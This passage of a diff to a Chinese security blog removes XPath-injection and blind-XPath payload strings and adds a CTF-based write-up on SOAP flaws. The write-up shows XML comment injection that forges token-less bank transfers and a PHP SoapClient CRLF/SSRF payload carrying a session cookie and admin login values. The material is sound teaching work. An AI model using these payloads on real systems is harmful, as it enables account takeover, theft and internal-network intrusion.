-<p>可以得到<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//users/user[loginID/text()='' or 1=1 or ''='' and password/text()='' or 1=1 or ''='']</span><br></pre></td></tr></table></figure></p>
-<p>那么查询语句将返回 true</p>
-<h3 id="Xpath盲注"><a href="#Xpath盲注" class="headerlink" title="Xpath盲注"></a>Xpath盲注</h3><p>方法类似于Sql注入，只是函数可能使用不同<br>提取当前节点的父节点的名称：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&apos; or substring(loginID(parent::*[position()=1]),1,1)=&apos;a</span><br><span class="line">&apos; or substring(loginID(parent::*[position()=1]),1,1)=&apos;b</span><br><span class="line">&apos; or substring(loginID(parent::*[position()=1]),1,1)=&apos;c</span><br><span class="line">....</span><br><span class="line">&apos; or substring(loginID(parent::*[position()=1]),2,1)=&apos;a</span><br><span class="line">&apos; or substring(loginID(parent::*[position()=1]),2,1)=&apos;b</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p>
-<p>如此循环可得到一个完整的父节点名称<br>确定address节点的名称后，攻击者就可以轮流攻击它的每个子节点，提取出它们的名称与值。（通过索引）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;or substring(//user[1]/*[2]/text(),1,1)=&apos;a&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">&apos;or substring(//user[1]/*[2]/text(),1,1)=&apos;b&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">&apos;or substring(//user[1]/*[2]/text(),1,1)=&apos;c&apos; or &apos;a&apos;=&apos;a</span><br><span class="line">.....</span><br></pre></td></tr></table></figure></p>
-<p>同时，既然将xml用作数据库，有可能存在泄漏问题,例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">accounts.xml</span><br><span class="line">databases.xml</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
-<p>这里还有一道实例题，有兴趣的可以参考一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/07/30/ISITDTU-CTF-Web/#Access-Box</span><br></pre></td></tr></table></figure></p>
-<h3 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h3><p>这一块可以参考我之前写过的soap总结<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://skysec.top/2018/07/25/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</span><br></pre></td></tr></table></figure></p>
-<p>既然xml作为标记语言，需要后台解析<br>那么我们在传递参数的时候，就可以插入标记语言<br>（就像html可以被插入，导致xss一样）<br>在后端解析的时候，就可以达到伪造的目的</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/u011794238/article/details/42173795" target="_blank" rel="noopener">https://blog.csdn.net/u011794238/article/details/42173795</a><br><a href="http://blog.51cto.com/12942149/1929669" target="_blank" rel="noopener">http://blog.51cto.com/12942149/1929669</a><br><a href="https://blog.csdn.net/Holmofy/article/details/78130039" target="_blank" rel="noopener">https://blog.csdn.net/Holmofy/article/details/78130039</a><br><a href="https://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="noopener">https://blog.csdn.net/u011721501/article/details/43775691</a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实习的时候不学点东西，和咸鱼有什么区别？<br>在看一篇writeup的时候，发现又出现了SOAP<br>感觉似曾相识，却想不起来，于是温习一波~</p>
+<h2 id="SOAP基础知识"><a href="#SOAP基础知识" class="headerlink" title="SOAP基础知识"></a>SOAP基础知识</h2><h3 id="SOAP的基本概念"><a href="#SOAP的基本概念" class="headerlink" title="SOAP的基本概念"></a>SOAP的基本概念</h3><p>什么是SOAP？这就要从WebService说起了<br>WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。<br>比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？<br> WebService就是出于以上类似需求而定义出来的规范：开发人员一般就是在具体平台开发webservice接口，以及调用webservice接口。每种开发语言都有自己的webservice实现框架。<br>而SOAP作为webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP 可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。<br><img src="/images/2018-07-25-19-58-09.png" alt=""><br>简单而言，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式<br>SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p>
+<h3 id="SOAP的组成"><a href="#SOAP的组成" class="headerlink" title="SOAP的组成"></a>SOAP的组成</h3><p>一条 SOAP消息的组成：一个包含有一个必需的 SOAP 的封装包，一个可选的 SOAP 标头和一个必需的 SOAP 体块的 XML 文档。<br>SOAP消息格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml</span></span><br><span class="line"><span class="php">　version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span></span></span><br><span class="line"><span class="tag">　<span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2001/12/soap-envelope"</span></span></span><br><span class="line"><span class="tag">　<span class="attr">soap:encodingStyle</span>=<span class="string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>其中<br>Envelope: 标识XML文档，具有名称空间和编码详细信息。<br>Header：包含标题信息，如内容类型和字符集等。<br>Body：包含请求和响应信息。<br>Fault：错误和状态信息。<br>而关于soap的漏洞，我将用两道ctf的案例进行讲解分析</p>
+<h2 id="SOAP漏洞利用之代码注入（一）"><a href="#SOAP漏洞利用之代码注入（一）" class="headerlink" title="SOAP漏洞利用之代码注入（一）"></a>SOAP漏洞利用之代码注入（一）</h2><p>题目如下<br><img src="/images/2018-07-25-20-13-07.jpg" alt=""><br>我们有如下功能<br>1.Profile：显示我们的当前身份和余额，每人最开始都有110元<br>2.Menu：主页面<br>3.Transfer：允许我们输入接收者ID并发送金额<br>4.VIP：需要1,000,000元才能进入该页面，应该是flag了<br>5.For Developers：告知我们api正在开发中，无法使用，但是html注释中有api的链接<br>不难看出，这是突破点，于是打开api链接后<code>api/bankservice.wsdl.php</code><br>不难提取如下两个SOAP API：<br>检查余额<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:requestBalance</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>wallet_num<span class="tag">&lt;/<span class="name">wallet_num</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:requestBalance</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>转账交易<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:internalTransfer</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>receiver_wallet_num<span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>sender_wallet_num<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span>amount<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span>token<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:internalTransfer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>一目了然，对于余额检查，输入一个钱包id即可<br>而对于转账交易，需要输入接受者、发送者、发送金额、token四个参数<br>而我们需要理由的点，也肯定是转账交易了<br>这样就可以将所有用户的初始余额汇总到我们手上，以此得到flag<br>但是问题来了，我们缺少交易的token，那么如何不需要token，即可让所有人给我们转账呢？<br>这里就用到了一些注入<br><img src="/images/2018-07-25-20-35-26.png" alt=""><br>经过插入后，代码成为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:internalTransfer</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>我们自己的id<span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>其他人<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;/receiver_wallet_num&gt;</span></span><br><span class="line"><span class="comment">        &lt;sender_wallet_num xsi:type="xsd:decimal"&gt;sender_wallet_num&lt;/sender_wallet_num&gt;</span></span><br><span class="line"><span class="comment">        &lt;amount xsi:type="xsd:float"&gt; </span></span><br><span class="line"><span class="comment">      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span>750000<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span>token<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:internalTransfer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>通过代码的拼接（有点类似于sql注入，但又不是，也是利用语句的拼接与注释），我们即可控制自己想控制的位置，已到达任意转账的目的<br><img src="/images/2018-07-25-20-35-43.jpg" alt=""><br>最后访问vip页面即可<br><img src="/images/2018-07-25-20-36-24.jpg" alt=""></p>
+<h2 id="SOAP漏洞利用之CRLF与SSRF（二）"><a href="#SOAP漏洞利用之CRLF与SSRF（二）" class="headerlink" title="SOAP漏洞利用之CRLF与SSRF（二）"></a>SOAP漏洞利用之CRLF与SSRF（二）</h2><p>这就要从php的soap说起了，正如之前所说每种开发语言都有自己的webservice实现框架，php也不例外：<br>PHP 的 SOAP 扩展可以用来提供和使用 Web Services<br>这个扩展实现了6个类。其中有三个高级的类： SoapClient、SoapServer 和SoapFault，<br>和三个低级类，它们是 SoapHeader、SoapParam 和 SoapVar。<br>他们的关系如下：<br><img src="/images/2018-07-26-08-43-26.jpg" alt=""><br>而我们的重点利用对象当然是soapclient类<br>而为什么soapclient会有CRLF(carriage return/line feed)注入攻击问题呢？<br>这又要从soapclient的一个选项说起，我们查阅PHP手册<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure></p>
+<p>其中的<code>$options</code>我们跟进查看<br><img src="/images/2018-07-26-08-53-12.png" alt=""><br>其中有一个选项为<code>user_agent</code><br>可以让我们自定义<code>User-Agent</code><br>为什么要利用<code>User-Agent</code>？<br>因为http header里有一个重要的<code>Content-Type为</code>和<code>Content-Length</code><br>既然我们想要进行CRLF注入，那么势必需要控制这两项才可以实现<br>而<code>User-Agent</code>的http header位置正好在这些之上，所以可以进行覆盖<br>对于<code>Content-Type</code>，如果我们想要利用CRLF发送post请求，那么要求它为<code>application/x-www-form-urlencode</code><br>那么此时就可以利用CRLF，构造如下payload（以N1CTF的payload为例）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:45\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=470837\r\n\r\n\r\n"</span>,<span class="string">'location'</span>=&gt;$location,</span><br><span class="line"><span class="string">'uri'</span>=&gt;$uri));</span><br></pre></td></tr></table></figure></p>
+<p>即可进行CRLF攻击<br>这样的攻击有什么用？<br>我们假设我们可以从外网调用到soap的api<br>而攻击目标是在内网<br>那么就可以利用soap攻击内网，因为CRLF的原因，可以增加我们的攻击面，包括sql注入，命令执行等等<br>所以也可以说是SSRF攻击了</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>和许多漏洞一样，如果实现不同功能的时候，接收到不同的恶意参数，那么也会引起各种各样的攻击<br>像是实现sql查询的功能，可以引起sql注入问题<br><img src="/images/2018-07-26-09-17-38.jpg" alt=""><br><img src="/images/2018-07-26-09-17-44.jpg" alt=""><br>实现lookupDNS web服务的功能时，可引起命令注入的问题<br><img src="/images/2018-07-26-09-17-52.jpg" alt=""><br><img src="/images/2018-07-26-09-17-57.jpg" alt=""></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>soap作为重要的消息通讯连接，如果过滤或者使用不当，很容易引起许多高危攻击<br>而本人不才，可能有许多点还没注意到，如有更好的观点，还请斧正！</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/kvienchen/p/8310798.html" target="_blank" rel="noopener">https://www.cnblogs.com/kvienchen/p/8310798.html</a><br><a href="http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/" target="_blank" rel="noopener">http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/</a></p>
 
     </article>
     <!-- license  -->
@@ -488,12 +415,17 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/08/18/浅析xml之xinclude-xslt/" title= 浅析xml之xinclude & xslt >
+                    <div class="nextTitle">浅析xml之xinclude & xslt</div>
+                </a>
+            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2018/08/28/RealWorldCTF-Web/" title= RealWorldCTF-Web >
-                    <div class="prevTitle">RealWorldCTF-Web</div>
+                <a href= "/2018/08/17/php函数默认配置引发的安全问题/" title= php函数默认配置引发的安全问题 >
+                    <div class="prevTitle">php函数默认配置引发的安全问题</div>
                 </a>
             
         </li>
@@ -509,7 +441,7 @@ height:50vh;
 <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
 <script>
     var gitment = new Gitment({
-        id: "Wed Aug 29 2018 08:00:21 GMT+0800", // 可选。默认为 location.href
+        id: "Fri Aug 17 2018 19:55:39 GMT+0800", // 可选。默认为 location.href
         owner: 'skyofkinglove',
         repo: 'sky.github.io',
         oauth: {
@@ -613,7 +545,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml基本概念"><span class="toc-number">2.</span> <span class="toc-text">xml基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是xml？"><span class="toc-number">2.1.</span> <span class="toc-text">什么是xml？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#什么是标记语言？"><span class="toc-number">2.2.</span> <span class="toc-text">什么是标记语言？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#标记语言的不同点"><span class="toc-number">2.3.</span> <span class="toc-text">标记语言的不同点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#归纳"><span class="toc-number">2.4.</span> <span class="toc-text">归纳</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml基础语法"><span class="toc-number">3.</span> <span class="toc-text">xml基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xml声明"><span class="toc-number">3.1.</span> <span class="toc-text">xml声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#根元素"><span class="toc-number">3.2.</span> <span class="toc-text">根元素</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML代码"><span class="toc-number">3.3.</span> <span class="toc-text">XML代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#处理指令"><span class="toc-number">3.4.</span> <span class="toc-text">处理指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实体"><span class="toc-number">3.5.</span> <span class="toc-text">实体</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xml解析方式"><span class="toc-number">4.</span> <span class="toc-text">xml解析方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM方式"><span class="toc-number">4.1.</span> <span class="toc-text">DOM方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SAX方式"><span class="toc-number">4.2.</span> <span class="toc-text">SAX方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#优缺点对比"><span class="toc-number">4.3.</span> <span class="toc-text">优缺点对比</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全隐患"><span class="toc-number">5.</span> <span class="toc-text">安全隐患</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-任意文件读取"><span class="toc-number">5.1.</span> <span class="toc-text">XXE-任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-任意文件盲读取"><span class="toc-number">5.2.</span> <span class="toc-text">XXE-任意文件盲读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xpath注入"><span class="toc-number">5.3.</span> <span class="toc-text">Xpath注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xpath盲注"><span class="toc-number">5.4.</span> <span class="toc-text">Xpath盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码注入"><span class="toc-number">5.5.</span> <span class="toc-text">代码注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOAP基础知识"><span class="toc-number">2.</span> <span class="toc-text">SOAP基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SOAP的基本概念"><span class="toc-number">2.1.</span> <span class="toc-text">SOAP的基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SOAP的组成"><span class="toc-number">2.2.</span> <span class="toc-text">SOAP的组成</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOAP漏洞利用之代码注入（一）"><span class="toc-number">3.</span> <span class="toc-text">SOAP漏洞利用之代码注入（一）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SOAP漏洞利用之CRLF与SSRF（二）"><span class="toc-number">4.</span> <span class="toc-text">SOAP漏洞利用之CRLF与SSRF（二）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他"><span class="toc-number">5.</span> <span class="toc-text">其他</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">6.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">7.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -626,6 +558,32 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -2951,62 +2909,62 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2018/08/29/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href= "/2018/08/18/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/28</span><a class="archive-post-title" href= "/2018/08/28/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2018/08/27/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/php函数默认配置引发的安全问题/" >php函数默认配置引发的安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/RealWorldCTF-Web/" >RealWorldCTF-Web</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/26</span><a class="archive-post-title" href= "/2018/08/26/MeePwn-Web-复现/" >MeePwn-Web-复现</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/xss-ssrf-redis/" >xss->ssrf->redis</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/SOAP及相关漏洞研究/" >SOAP及相关漏洞研究</a>
+            <span class="archive-post-date">08/17</span><a class="archive-post-title" href= "/2018/08/17/浅析xml及其安全问题/" >浅析xml及其安全问题</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/2018/08/25/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/Upload-labs&Upload Bypass Summarize/" >Upload-labs&Upload Bypass Summarize</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/24</span><a class="archive-post-title" href= "/2018/08/24/xss-ssrf-redis/" >xss->ssrf->redis</a>
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2018/08/16/inndy-crypto-writeup/" >inndy-crypto-writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/23</span><a class="archive-post-title" href= "/2018/08/23/浅析xml之xinclude-xslt/" >浅析xml之xinclude & xslt</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/一道CTF题引发的思考-sql注入/" >一道CTF题引发的思考-sql注入</a>
+            <span class="archive-post-date">08/15</span><a class="archive-post-title" href= "/2018/08/15/从一道CTF题引发的思考/" >从一道CTF题引发的思考</a>
         </li>
     
     
         <li class="archive-post-item">
